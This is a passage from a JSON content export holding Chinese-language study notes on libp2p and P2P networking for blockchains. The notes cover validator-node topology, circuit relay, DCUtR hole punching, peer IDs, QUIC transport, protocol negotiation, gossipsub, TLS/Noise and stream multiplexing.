Bucket）等算法，根据网络状况动态调整发送速率。\n根据验证节点优先相连，还能和普通节点连接\nDHT（分布式哈希表）通常根据哈希值距离来建立连接。要实现让验证节点保持紧密连接，可以采用以下策略：\n基于角色的分布式哈希表（R-DHT）：\n在原始DHT的基础上引入角色概念，将网络中的节点分为验证节点和普通节点。设计一个角色敏感的哈希函数，使验证节点在DHT中更有可能彼此靠近。这样，在查找和建立连接时，验证节点将更容易找到并连接到其他验证节点。\n验证节点专属子网络：\n在整个P2P网络中为验证节点创建一个子网络。验证节点加入子网络后，会优先与其他子网络中的验证节点建立连接。子网络可以使用与主网络相同或不同的DHT实例。为了让验证节点还能连接普通节点，可以允许它们在子网络外部与普通节点建立一定数量的连接。\n分层网络结构：\n设计一种分层网络结构，将验证节点分布在网络的上层，普通节点分布在下层。在这种结构下，上层验证节点会优先与其他验证节点建立连接，形成紧密连接。同时，验证节点还可以与下层普通节点建立连接。\n混合拓扑策略：\n结合结构化（如DHT）和非结构化（如随机图）拓扑技术，设计一种混合拓扑策略。验证节点之间使用非结构化拓扑建立紧密连接，而与普通节点之间使用结构化拓扑进行通信。这样，验证节点可以在保持紧密连接的同时与普通节点建立连接。\n以上策略可以帮助实现验证节点间的紧密连接，同时允许验证节点与一定数量的普通节点建立连接\n为了实现验证节点间的快速共识消息传输，可以采用以下网络拓扑和消息广播策略：\n优先连接验证节点：实现基于角色的连接策略，使验证节点在连接到其他验证节点时具有更高的优先级。这将确保验证节点之间紧密相连，有利于快速传\t播共识消息。\n子网络拓扑：在整个P2P网络中为验证节点创建一个子网络。验证节点加入子网络后，会优先与其他子网络中的验证节点建立连接。可以使用gossip协议或其他类似协议来实现子网络中的消息传播。为了让验证节点还能连接普通节点，可以允许它们在子网络外部与普通节点建立一定数量的连接。\n消息广播策略：采用gossip协议进行消息广播。在gossip协议中，节点之间会定期交换信息，每个节点收到一条新消息后会将其转发给其他已连接的节点。这种方式可以确保消息在验证节点间快速传播。为了降低消息传播延迟，可以采用以下策略：\n优先转发共识消息：在处理接收到的消息时，优先处理和转发共识相关的消息。\n限制消息的转发次数：为了避免消息在网络中过度传播，可以为每条消息设置一个最大转发次数。当转发次数达到限制时，节点将不再转发该消息。\n使用消息缓存：为了避免重复转发相同的消息，可以在每个节点上维护一个消息缓存。当接收到一条已经在缓存中的消息时，节点将不再转发该消息。\n跨层次通信：为了让验证节点与普通节点之间也能进行有效的通信，可以实现跨层次通信协议。在这种协议中，验证节点会将部分共识消息广播给普通节点，让普通节点了解到共识状态的变化。同时，普通节点也可以向验证节点发送交易和查询请求。\n通过这些网络拓扑和消息广播策略的组合，可以实现验证节点间的快速共识消息传输，同时确保验证节点与普通节点之间的有效通信。请注意，这里给出的设计仅供参考，实际实现可能需要根据您的网络需求和设计进行调整。"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕Libp2p之circuit-relay":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕Libp2p之circuit-relay","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕Libp2p之circuit relay.md","title":"死磕Libp2p之circuit relay","links":[],"tags":[],"content":"circuit relay 是什么\n电路继电器是一种传输协议，可通过第三方“中继”对等方在两个peer之间的流量路由。\n在许多情况下，peers将无法以使他们公开访问的方式穿越其NAT和/或防火墙。或者他们可能不会共享可以直接交流的通用传输协议。\n为了在NAT（例如NAT）等连接障碍物面前启用对等体系结构，Libp2p定义了一种称为P2P-Circuit的协议。当peer无法在公共地址上收听时，它可以拨打到relay peer，这将保持长期的连接。其他同行将能够使用P2P-circuit地址拨打relay peer，该地址将转发到其目的地。\n中继协议的一个重要方面是它不是“透明的”。换句话说，源和目的地都知道流量正在被中继。这很有用，因为目的地可以看到用于打开连接的中继地址，并可能使用它来构造返回源的路径。它也不是匿名的——所有参与者都使用他们的对等ID进行识别，包括中继节点。\n中继地址\n中继电路是使用多地址识别的，该多地址包括其流量正在被中继的对等体（侦听对等体或“中继目标”）的对等体ID。\n假设我有一个对等体ID为QmAlice。我想把我的地址发给我的朋友QmBob，但我的NAT不允许任何人直接拨我。\n我能构造的最基本的p2p电路地址如下所示：\n/p2p-circuit/p2p/QmAlice\n上面的地址很有趣，因为它不包括我们想要联系的对等点（QmAlice）或将传送流量的中继对等点的任何传输地址。如果没有这些信息，同伴给我打电话的唯一机会就是发现中继，并希望他们能与我建立联系。\n一个更好的地址应该是/p2p/QmRelay/p2p-circuit/p2p/QmAlice。这包括特定中继对等体QmRelay的标识。如果对等方已经知道如何打开与QmRelay的连接，他们将能够联系到我们。\n更好的做法是在地址中包含中继对等方的传输地址。比方说，我已经用对等ID QmRelay建立了到特定中继的连接。他们通过识别协议告诉我，他们正在侦听IPv4地址为198.51.100.0的55555端口上的TCP连接。我可以构建一个地址，描述通过该传输的特定中继到我的路径：\n/ip4/198.51.100.0/tcp/55555/p2p/QmRelay/p2p-circuit/p2p/QmAlice\n在/p2p-circuit/上面之前的所有内容都是中继对等体的地址，其中包括传输地址和它们的对等体ID QmRelay。在/pp-circuit/之后是线路另一端我的对等端的对等端ID，QmAlice。\n通过将完整的中继路径提供给我的朋友QmBob，他们能够快速建立中继连接，而不必“四处打听”有通往QmAlice的中继。\n中继过程\n\n\n\n节点A位于NAT和/或防火墙后面，例如通过AutoNAT服务检测到的。\n\n\n因此，节点A请求与中继器R进行预约。即，节点A要求中继器R代表其监听传入连接。\n\n\n节点B想要建立到节点a的连接。假设节点a不通告任何直接地址，而只通告中继地址，节点B连接到中继R，要求中继R中继到a的连接。\n\n\n中继R将连接请求转发到节点A，并最终中继A和B发送的所有数据\n\n"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之DCUtR":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之DCUtR","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之DCUtR.md","title":"死磕libp2p之DCUtR","links":[],"tags":[],"content":"中继是用作代理以遍历NAT的，但是这种方法扩展和维护成本高，可能会导致低带宽、高延迟的连接。打洞是另一种技术，它使在NAT后面的两个节点能够直接通信。然而，除了中继节点之外，它还需要另一种基础设施，称为信令服务器。\n信令服务器是指用于在P2P网络中促进节点之间通信的服务器或服务，具体而言是用于建立、维护和终止两个在NAT后面的节点之间的直接通信通道的。它有助于发现节点的外部IP地址和端口，并通过在节点之间中继消息来遍历NAT。\n好消息是，libp2p提供了一个打洞解决方案，消除了集中式的信令服务器的需求，并允许使用分布式中继节点。\n什么是通过中继进行直接连接升级\nlibp2p DCUtR（通过中继进行直接连接升级）是一种协议，用于通过打洞建立节点之间的直接连接，无需信令服务器。DCUtR涉及到同步和打开连接到每个节点的预测外部地址。\nDCUtR协议使用协议ID /libp2p/dcutr，并涉及连接和同步消息的交换。\nDCUtR协议支持不同类型的连接，如TCP和QUIC，建立连接的过程对于每种类型都是不同的。"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之Peer":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之Peer","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之Peer.md","title":"死磕libp2p之Peer","links":[],"tags":[],"content":"Peer ID\n对等体标识（通常写为PeerID）是对整个对等网络中特定对等体的唯一引用。\n除了作为每个对等体的唯一标识符外，对等体ID也是对等体与其公共密钥之间的可验证链接。\n每个libp2p对等端都控制一个私钥，对所有其他对等端保密。每个私钥都有一个相应的公钥，并与其他对等方共享。\n公钥和私钥（或“密钥对”）一起允许对等方建立彼此之间的安全通信信道。\n从概念上讲，对等体ID是对等体公钥的加密哈希。当对等方建立安全通道时，散列可以用于验证用于保护通道的公钥是否与用于识别对等方的公钥相同。\nPeer ID规范详细介绍了用于libp2p公钥的字节格式，以及如何对密钥进行散列以生成有效的Peer ID。\n对等 ID 如何表示为字符串\n对等Id是多散列，它被定义为一种紧凑的二进制格式。\n使用比特币使用的相同字母表，将多哈希编码到base58是很常见的。\n以下是对等ID的一个示例，表示为base58编码的多散列：QmYyQSo1c1Ym7或WxLYvCrM2EmxFTANf8wXmmE7DWjhx5N\n虽然可以用许多文本格式（例如，十六进制、base64等）表示多散列，但对等ID总是使用base58编码，在编码为字符串时没有多基前缀\n多地址中的Peer ID\n对等体ID可以作为p2p地址编码到多地址中，并将对等体ID作为参数。\n如果我的对等ID是QmYyQSo1c1Ym7或WxLYvCrM2EmxFTANf8wXmmE7DWjhx5N，则我的libp2p多地址为\n/p2p/QmYyQSo1c1Ym7orWxLYvCrM2EmxFTANf8wXmmE7DWjhx5N\n与其他多地址一样，可以将P2P地址封装到另一个多地址中，以组成一个新的多地址。例如，我可以将上面的内容与传输地址/ip4/198.51.100.0/tcp/4242结合起来，生成这个非常有用的地址：\n/ip4/198.51.100.0/tcp/4242/p2p/QmYyQSo1c1Ym7orWxLYvCrM2EmxFTANf8wXmmE7DWjhx5N\n这提供了足够的信息，可以通过TCP/IP传输拨打特定的对等方。在拨号过程中，如果遇到了IP地址或端口被其他节点使用的情况，由于Peer ID是由密钥生成的，因此控制该IP地址或端口的节点将无法使用相同的Peer ID，这一点很容易被察觉。因此，通过Peer ID来标识节点，能够帮助我们避免遇到恶意节点的欺诈行为。\nPeer Info\n另一种与对等身份相关的常见libp2p数据结构是PeerInfo结构。\n对等方信息将对等方ID与对等方正在侦听的一组多地址相结合。\nPeer store\nibp2p节点通常会有一个临时存储区来存储对等密钥、地址和相关元数据。peer store 的工作原理类似于电话簿或通讯簿；把它想象成一本通用的多地址书，为所有已知的同行维护真实来源。\n具体而言，Peerstore用于存储以下信息：\n\n节点ID\n节点地址列表\n节点公钥等\n\nPeerstore在P2P网络中扮演着非常重要的角色，因为它允许节点了解其他节点的信息并建立与这些节点的连接。例如，当节点需要与另一个节点进行连接时，它可以在Peerstore中查找该节点的信息，包括其ID和地址等，然后利用这些信息向该节点发起连接请求。\nPeerstore还允许节点根据需要管理其他节点的信息，例如删除过期或不再需要的节点信息，或向Peerstore中添加新的节点信息等。这在处理网络故障和节点失效等情况时非常有用。\nPeer Discovery\n当peer store中没有关于某个节点的信息时，需要使用发现方法来寻找其地址信息。一般情况下，可以通过节点的Peer ID来发现其地址。当一个节点的地址被成功发现并与其建立连接后，其信息（包括Peer ID和地址）将被添加到peer store中，以备后续使用。\n如果peer store中没有关于某个节点的信息，则需使用发现方法来寻找其地址信息。peer routing guide中提供了有关如何发现未知节点的更多信息。添加新节点信息的过程中，会将该节点的连接地址和节点信息存储在peer store中供其他节点查找和使用。通过这种方式，可以使网络中的节点互相发现和连接，从而增强P2P网络的稳定性和可用性。广泛的连接协议。"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之传输":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之传输","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之传输.md","title":"死磕libp2p之传输","links":[],"tags":[],"content":"listen&amp;dial\n通用传输接口\n传输是根据两个核心操作来定义的，即监听和拨号。\n侦听意味着您可以使用传输实现提供的任何功能来接受来自其他对等方的传入连接。例如，unix平台上的TCP传输可以使用绑定和侦听系统调用，让操作系统将给定TCP端口上的流量路由到应用程序。\n拨号是打开与侦听对等方的传出连接的过程。与监听一样，具体内容由实现决定，但libp2p实现中的每个传输都将共享相同的编程接口。\n地址\n在建立对peer的拨号连接之前，我们需要知道如何访问这些peer。由于每种传输方式会有其独特的寻址方案，因此libp2p采用了一种称为“Multiaddress”或“Multiaddr”的协议来编码许多不同的寻址方案。\n下面是一个针对TCP/IP传输的Multiaddr示例：\n/ip4/198.51.100.0/tcp/6543\n这与更常见的“198.51.100.0: 6543”写法是等价的，但它具有显式说明所涉及协议的优势。通过Multiaddr，您可以一目了然地看出198.51.100.0地址属于IPv4协议，而6543则属于TCP协议\n“dial”和“listen”都涉及Multiaddress。在监听时，您向传输层提供您要监听的地址，在拨打对等端时，则需要提供将要拨打的地址。\n在拨打远程对等节点时，Multiaddress应包括您想要连接的对等节点的Peer ID。这使libp2p能够建立安全通信通道并防止身份伪装。\n下面是一个包含Peer ID的Multiaddress示例：\n/ip4/192.0.2.0/tcp/4321/p2p/QmcEPrat8ShnCph8WjkREzt5CPXF2RwhYxYBALDcLC1iV6\n其中的“/p2p/QmcEPrat8ShnCph8WjkREzt5CPXF2RwhYxYBALDcLC1iV6”组件使用公钥的哈希唯一地标识了远程对等节点\n支持多个传输\nlibp2p应用程序通常需要同时支持多个传输方式。例如，您可能希望您的服务可以通过TCP从长时间运行的守护进程使用，同时也可以接受来自在Web浏览器中运行的对等节点的WebSocket连接。\n负责管理多种传输方式的libp2p组件称为“switch”，它还协调协议协商、流多路复用、建立安全通信以及其他形式的“连接升级”。\nswitch提供了单个“入口点”进行拨号和监听，使您的应用程序代码无需担心特定的传输方式和其他底层使用的“连接堆栈”组件。\n可以将它看作是一个高级接口，可以让我们更轻松地编写支持多种传输方式的复杂应用程序，并且无需深入了解底层实现细节\nQUIC\nQUIC是一种新的传输协议，它提供了一种建立在UDP之上的始终加密的流复用连接\nTCP关键挑战\nHead-of-line blocking (HoL)：当一个数据包在传输过程中被丢失时，后续的数据包需要等待该数据包重传后才能被传输，这样就导致了传输的阻塞。因为TCP是基于字节流传输的，数据包之间没有明确的边界，所以即使只有一个数据包丢失，后面的数据也需要等待该数据包的重传，这样就会导致后面的数据包无法及时到达接收方，从而增加了延迟和拥塞。\nOssification：由于TCP的协议头不加密，中间节点可以检查和修改TCP协议头字段，当它们遇到任何不理解的字段时可能对TCP协议破坏，这使得更改TCP协议的任何线路格式变得几乎不可能。\n握手效率低下：TCP花费一次网络往返时间（RTT）来验证客户端的地址。只有在此之后，TLS才能开始密码握手，再消耗一次RTT。因此，建立加密连接始终需要两个RTTs。\nQUIC的设计考虑了以下目标：\n\n\n流传输不会导致Head-of-line blocking (HoL)问题，因为在流传输中，数据是被划分为多个数据流（stream）并独立传输的。每个数据流都有自己的编号，并且数据包里面带有数据流的编号信息，接收方可以根据数据流的编号把数据包放到正确的数据流中，从而避免了传输过程中的Head-of-line blocking问题\n\n\n将连接建立的延迟时间降至单个RTT，以允许为恢复的连接发送零RTT应用程序数据。\n\n\n尽可能加密。这消除了ossification的风险，因为中间节点无法读取任何加密的字段。\n\n\nQUIC怎么工作的\n它不是基于TCP构建，而是基于UDP构建。当一个UDP数据包丢失时，内核不会自动重传数据包。因此，QUIC负责自行检测和修复丢失的数据包。通过使用加密，QUIC避免了中间节点的强制陈旧。TLS 1.3握手在首个数据包包中完成，省去了验证客户端地址的成本并节省一个RTT。此外，QUIC还暴露多个数据流（而不仅仅是单字节流），因此应用层不需要流多路复用器。部分应用层也直接构建在QUIC中。\n此外，当客户端已经与某个服务器通信过，可以在后续连接中利用QUIC的0 RTT功能。客户端可以在QUIC握手完成之前就发送（加密的）应用数据\nQUIC本机多路复用\n一个QUIC数据包可以携带来自一个或多个数据流的帧所包含的流数据。由于即使乱序接收，QUIC数据包也可以被解密，这解决了流多路复用器应用于TCP连接时遇到的Head-of-line阻塞问题：如果包含某个流的流数据的数据包丢失，这只会阻塞该流的进展，而所有其他流仍然可以继续前进。\nlibp2p中的QUIC\nlibp2p仅支持双向数据流，同时默认使用TLS 1.3。由于QUIC已经提供了加密的流多路复用连接，libp2p直接使用QUIC数据流，无需任何额外的框架。\n为了认证各自的对等方ID，节点将自己的对等方ID编码到一个自签名证书中，并使用主机的私钥签名。这与libp2p TLS握手中对等方ID进行认证的方式相同。"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之协议":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之协议","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之协议.md","title":"死磕libp2p之协议","links":[],"tags":[],"content":"libp2p协议\n协议ID\nibp2p协议具有唯一的字符串标识符，这些标识符在首次打开连接时用于协议协商过程\n\n/my-app/amazing-protocol/1.0.1\n\n如果有重大更改，会产生新的版本号。\n处理函数\n当传入流被标记为注册的协议 ID 时，将调用对应的处理函数。\n二进制流\nlibp2p 协议传输的“介质”是具有以下属性的双向二进制流：\n\n每一方都可以随时从流中读取和写入\n数据的读取顺序与写入顺序相同\n可以是“半封闭”，即写封闭读开，或者读封闭写写\n\nlibp2p 还将确保流的安全和高效 多路复用。这对协议处理程序是透明的，协议处理程序通过流读取和写入未加密的二进制数据。\n二进制数据的格式以及何时以及由谁发送什么的机制都由协议决定。\n协议协商\n当 dial out 以启动新的流时，libp2p将发送您想要使用的协议的协议id。另一端的监听peer将根据注册的协议处理程序检查传入的协议id。\n如果不支持请求的协议，它将结束流，并且拨号peer可以使用不同的协议重试，或者可能使用最初请求的协议的回退版本。\n如果支持该协议，则侦听对等方将回显协议id，作为将来通过流发送的数据将使用商定的协议语义的信号。\n这种就给定流或连接使用什么协议达成一致的过程称为协议协商。\n协议匹配\n\n通过协议ID匹配\n协议ID没有确切的匹配，模糊匹配\n\ndial 特定协议\n当拨号给远程Peer以打开新流时，发起对等端会发送他们想要使用的协议id。远程对等方将使用上述匹配逻辑来接受或拒绝该协议。如果协议被拒绝，拨号对等方可以重试。\n拨号时，您可以选择提供一个协议id列表，而不是单个id。当您提供多个协议id时，将依次尝试每个协议id，如果远程对等方至少支持其中一个协议，则将使用第一个成功匹配。拨号端可以回退到和远程端匹配的版本。\n核心libp2p协议\n常见模式\n下面描述的协议都使用协议缓冲区（又名protobuf）来定义消息模式。\n消息是使用一个非常简单的约定通过有线进行交换的，该约定在二进制消息payload前面加一个整数，该整数表示有效载荷的长度（以字节为单位）。长度被编码为protobuf-variant（可变长度整数）。\nping\n\n/ipfs/ping/1.0.0\n\nping协议是一种简单的活跃度检查，对等方可以使用它来快速查看另一个对等方是否在线。\n在初始协议协商之后，拨号对等方发送32字节的随机二进制数据。监听对等端回显数据，拨号对等端将验证响应并测量请求和响应之间的延迟。\nidentify\n\n/ipfs/id/1.0.0\n\n识别协议允许对等方交换关于彼此的信息，尤其是它们的公钥和已知网络地址。\n基本识别协议通过使用上表中所示的识别协议id建立到对等端的新流来工作。\n当远程对等端打开新的流时，他们将填写一条Identify protobuf消息，其中包含关于他们自己的信息，例如他们的公钥，该公钥用于派生他们的对等端ID。\n重要的是，Identify消息包括一个observedAddr字段，该字段包含对等方观察到请求的多地址。这有助于对等方确定其NAT状态，因为它允许他们查看其他对等方观察的公共地址，并将其与自己的网络视图进行比较。\n在P2P网络中，对等方可能被部署在不同的网络中，包括NAT（网络地址转换）网络。NAT网络中的设备无法直接访问来自外部网络的数据包，因为它们被阻止或者重定向到本地网络。为了克服这种情况，对等方需要在网络上建立一个多地址视图，以便其他对等方了解它们的公共地址。观察到请求的多地址可以让对等方更好地理解自己的网络情况，并比较其视图与其他对等方观察到的公共地址之间的差异。这有助于对等方更好地了解其NAT状态，并更好地管理其网络资源\nidentify/push\n与identify略有不同，identify/push 协议发送相同的identify消息，但它是主动发送的，而不是响应请求。\n如果对等端开始监听新地址，建立新的中继电路，或者使用标准identify协议从其他对等端获悉其公共地址，这是有用的。在创建或获悉新地址后，对等方可以将新地址推送给其当前知道的所有对等方。这样可以使每个人的路由表保持最新，并使其他对等方更有可能发现新地址\nCircuit Relay\n\n/libp2p/circuit/relay/0.1.0\n\nlibp2p提供了一种协议，用于在两个对等体无法直接连接时通过中继对等体隧道传输流量。"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之发布订阅":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之发布订阅","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之发布订阅.md","title":"死磕libp2p之发布订阅","links":[],"tags":[],"content":"什么是发布订阅\n发布/订阅是一个系统，同行们聚集在他们感兴趣的主题周围。据说对某个主题感兴趣的同行们订阅了该主题。\n\n同行可以向主题发送消息。每条消息都将发送给订阅该主题的所有对等方：\n\n\n\n聊天室。每个房间都是一个酒吧/子主题，客户发布聊天消息，房间里的所有其他客户都会收到这些消息。\n\n\n文件共享。每个发布/子主题代表一个可以下载的文件。上传者和下载者在发布/子主题中公布他们拥有的文件片段，并协调发布/子系统之外的下载。\n\n\n设计目标\n在对等发布/子系统中，所有对等体都参与在整个网络中传递消息。对等发布/订阅系统有几种不同的设计，它们提供了不同的权衡。理想的属性包括：\n可靠性：所有消息都将传递给订阅该主题的所有对等方。\n速度：信息传递迅速。\n效率：网络中没有过多的消息副本。\n弹性：对等方可以在不中断网络的情况下加入和离开网络。没有故障的中心点。\n规模：主题可以有大量的订阅者，并处理大量的消息。\n简单性：该系统易于理解和实现。每个对等体只需要记住一小部分状态。\nibp2p目前使用的是一种名为“八卦”的设计。它之所以命名，是因为同行们互相八卦他们看到了哪些消息，并利用这些信息来维护消息传递网络。\n发现\n在对等方可以订阅某个主题之前，它必须找到其他对等方并与其建立网络连接。pub/sub系统本身没有任何发现对等点的方法。相反，它依靠应用程序来代表自己寻找新的对等点，这一过程称为环境对等点发现。\n发现对等点的潜在方法包括：\n\n\n分布式哈希表\n\n\n本地网络广播\n\n\n与现有对等方交换对等方列表\n\n\n集中式跟踪器或集合点\n\n\n引导对等程序列表\n\n\n例如，在Bittorrent应用程序中，上述大多数方法都将在下载文件的过程中使用。通过重复使用Bittorrent应用程序有关其常规业务时发现的同行，该应用程序也可以建立一个强大的酒吧/子网络。\n询问发现的同行是否支持酒吧/子协议，如果是的，则将其添加到酒吧/子网络中。\npeer 类型\n在Gossipsub中，对等方通过全信息的同伴或仅限元数据的同伴相互连接。整体网络结构由这两个网络组成：\n\n完整的消息\n全消息节点对被用于在整个网络中传输消息的完整内容。这个网络是稀疏连接的，每个节点只连接了几个其他节点。（在gossipsub规范中，这个稀疏连接的网络被称为网格，其中的节点称为网格成员。）\n限制完整消息节点对的数量很有用，因为它可以控制网络的流量量。每个节点只向少数几个节点转发消息，而不是所有节点。每个节点都有一个它想要连接的目标节点数。在这个例子中，每个节点理想情况下想要连接3个其他节点，但也可以接受2-4个连接：\n\n节点度数（也称为网络度数或D）控制了网络速度、可靠性、弹性和效率之间的权衡。更高的节点度数有助于更快地传递消息，有更好的机会到达所有订阅者，并且更少的机会被其他节点离开时干扰网络。然而，高节点度数也会导致每条消息的额外冗余副本在整个网络中发送，增加了参与网络所需的带宽。\n在libp2p的默认实现中，理想的网络节点度数为6，接受4-12个节点度数都可以。\n仅元数据\n除了全消息节点对的稀疏连接网络，还有一个密集连接的仅元数据节点对网络。这个网络由节点之间所有不是全消息节点对的网络连接组成。\n仅元数据网络分享有关可用消息的八卦，并执行帮助维护全消息节点对网络的功能。\n\n嫁接和修剪\n节点对是双向的，这意味着对于任意两个连接的节点，两个节点都认为它们之间的连接是全消息或是两个节点都认为它们之间的连接是仅元数据。\n任何一个节点都可以通过通知另一个节点来更改连接类型。嫁接是将仅元数据连接转换为全消息的过程。修剪是相反的过程；将全消息节点对转换为仅元数据：\n\n当一个节点有太少的全消息节点对时，它会随机将一些仅元数据节点对转换为全消息节点对：\n\n相反地，当一个节点有太多的全消息节点对时，它会随机地将其中一些节点对修剪为仅元数据节点对：\n\n在libp2p的实现中，每个节点每1秒执行一系列检查。这些检查称为心跳。在此期间进行嫁接和修剪操作。\n订阅和取消订阅\n节点会跟踪其直接连接的节点订阅的主题。利用这些信息，每个节点可以建立其周围主题和订阅每个主题的节点的图像:\n\n跟踪订阅是通过发送subscribe（订阅）和unsubscribe（取消订阅）消息来实现的。当两个节点之间建立新的连接时，它们首先彼此发送订阅主题的列表：\n\n然后随着时间的推移，每当一个节点订阅或取消订阅某个主题，它会向每个节点发送subscribe或unsubscribe消息。这些消息会发送给所有连接的节点，无论接收节点是否订阅了相关主题：\n\n当一个节点取消订阅某个主题时，它会同时通知其全消息节点对其连接已被修剪，同时发送其unsubscribe消息：\n\n发送消息\n当一个节点想要发布一条消息时，它将向其连接的所有全消息节点发送一个副本：\n\n同样，当一个节点从另一个节点接收到一条新消息时，它会存储消息并将副本转发给其连接的所有其他全消息节点：\n\n在Gossipsub规范中，节点也被称为路由器，因为它们通过网络路由消息的功能。\n节点会记住最近收到的消息清单。这使得节点只有在第一次看到消息时才会对其采取行动，并忽略已经收到的消息的重发。\n节点可能还会选择验证每个接收到的消息的内容。什么是有效和无效的，取决于应用程序。例如，聊天应用程序可能强制要求所有消息都必须短于100个字符。如果应用程序告诉libp2p某个消息无效，那么该消息将被丢弃，并且不会在整个网络中继续被复制。\ngossip\n节点会在网络中广播它们最近收到的消息。每秒钟，每个节点会随机选择6个仅有元数据的节点，并向它们发送自己最近收到的消息列表。\n\n广播消息的目的是让节点有机会注意到它们在全消息网络中是否错过了某条消息。如果一个节点发现自己重复错过消息，则可以与已经拥有这些消息的节点建立新的全消息连接。\n以下是具体消息如何在仅有元数据连接中请求的示例：\n\n在Gossipsub规范中，广播最近收到的消息被称为IHAVE消息，请求特定消息的消息被称为IWANT消息。\nFan_out\n节点可以发布到它们未订阅的主题。有一些特殊的规则可以确保这些消息能够可靠地传递。\n当一个节点第一次想要向一个它未订阅的主题发布一条消息时，它会随机选择6个已订阅该主题的节点（下面显示了其中的3个），并将它们作为该主题的扇出节点进行记忆：\n\n与其他类型的连接不同，扇出连接是单向的；它们总是从主题外的节点指向订阅主题的节点。订阅该主题的节点不会被告知它们已被选中，并且仍将该连接视为任何其他仅有元数据的连接。\n每当发送方想要发送一条消息时，它会将消息发送给它的扇出节点，然后在主题内分发该消息。\n\n如果发送方要发送一条消息，但注意到上次以来它的一些扇出节点已经离开了，它会随机选择其他扇出节点，将数量补充至6个。\n当节点订阅一个主题时，如果它已经有了一些扇出节点，它会优先选择它们作为全消息节点：\n\n如果在某个主题上连续2分钟没有发送任何消息，所有该主题的扇出节点都将被遗忘：\n\nNetwork packets\n节点在网络上实际发送给对方的数据包是本指南中涉及到的所有不同消息类型的组合（应用消息、有/想拥有、订阅/取消订阅、接受/拒绝）集合。这种结构允许将多种不同的请求批量发送到单个的网络数据包中。\n以下是网络数据包结构的图示表示：\n\n请参考规范以了解用于编码网络数据包的确切 Protocol Buffers 模式。\n状态\n以下是每个节点在参与发布/订阅网络时必须记住的状态摘要：\n订阅：已订阅的主题列表。\n扇出主题：这些是最近发布过但未订阅的主题。对于每个主题，记住上次发送到该主题的时间。\n当前连接的对等方列表：对于每个已连接的对等方，状态包括它们订阅的所有主题以及每个主题的连接方式是完整内容、仅元数据还是扇出。\n最近查看的消息：这是一个最近查看的消息缓存。它用于检测和忽略重新发送的消息。对于每条消息，状态包括发送者和序列号，这足以唯一标识任何消息。对于非常近期的消息，仍然保留完整消息内容，因此可以将其发送给请求该消息的任何对等方。\n"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之安全通信":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之安全通信","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之安全通信.md","title":"死磕libp2p之安全通信","links":[],"tags":[],"content":"TLS\nTLS（传输层安全）是一种用于保护没有内建安全功能（例如TCP、WebSocket）的传输的安全握手协议之一。噪声（Noise）是TLS的替代方案，也是另一种用于保护传输的安全握手协议。\n什么是TLS？\nTLS是一种建立安全数据通道的加密协议。TLS提供加密、认证和数据完整性。\n在TLS握手过程中，客户端和服务器之间建立了一个安全连接。握手完成后，双方都派生了一个密钥（TLS主密钥），只有这两个对话方知道该密钥，然后用于加密通过通道发送的应用程序数据。\n什么是TLS 1.3？\nTLS 1.3是TLS协议的一个新版本，于2018年在RFC 8446中发布。它比TLS 1.2带来了几个改进：在典型情况下，握手的延迟从2个网络往返降至1个网络往返；通过加密证书来改善隐私属性；并且简化协议以减少实现复杂性。\n握手\nlibp2p使用TLS 1.3握手来建立两个节点之间的安全连接。节点在握手期间会验证对方的libp2p对等ID。\n在协议协商过程中，TLS 1.3可通过以下协议ID进行识别：/tls/1.0.0。\n节点身份验证是通过将公钥编码到TLS证书中来完成的。我们设计了该系统以验证TLS不支持的密钥类型，如sepc256k1（一种可用于libp2p密钥的密钥类型）。\n在处理TLS证书时，节点会从接收到的公钥中派生对等ID。发起连接的节点会检查其是否与其意图连接的节点的对等ID匹配。\nNoise\nNoise协议框架是一种广泛使用的加密方案，它通过将密码原语组合成具有可验证安全性质的模式来实现安全通信。\n了解更多信息，请访问noiseprotocol.org。\nlibp2p中的Noise\nlibp2p使用Noise协议框架对节点之间的数据进行加密并提供前向保密性。noise-libp2p是Noise协议框架的一种实现，用于通过交换密钥和在libp2p握手过程中加密流量来建立两个节点之间的安全通道。成功完成Noise握手后，生成的密钥通过安全通道发送密文消息。这些消息的线路格式和用于加密的密码原语在libp2p-noise规范中指定。"},"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之流复用":{"slug":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之流复用","filePath":"blockchainguide/Public_Chain_Development/P2P_Network/p2p/死磕libp2p之流复用.md","title":"死磕libp2p之流复用","links":[],"tags":[],"content":"流复用\nlibp2p是基于流抽象构建的，并使用双向消息流在节点之间发送数据。然而，仅依赖两个节点之间的单个消息流可能会导致可扩展性问题和瓶颈。每个连接的两端的节点可能会运行多个应用程序，通过流发送和等待数据。单个流会阻塞彼此间的应用程序，因为一个应用程序需要等待另一个应用程序完成利用流后才能发送和接收自己的消息。\n为解决这个问题，libp2p允许应用程序使用流多路复用。多路复用允许在单个连接中创建多个“虚拟”连接。这使节点可以通过单独的虚拟连接发送多个流的消息，提供可扩展的解决方案，消除单个流创建的瓶颈。两个libp2p节点可以有一个TCP连接，并使用不同的端口号来区分流。然后像IPFS使用的Kademlia或GossipSub这样的不同应用程序/进程会获得自己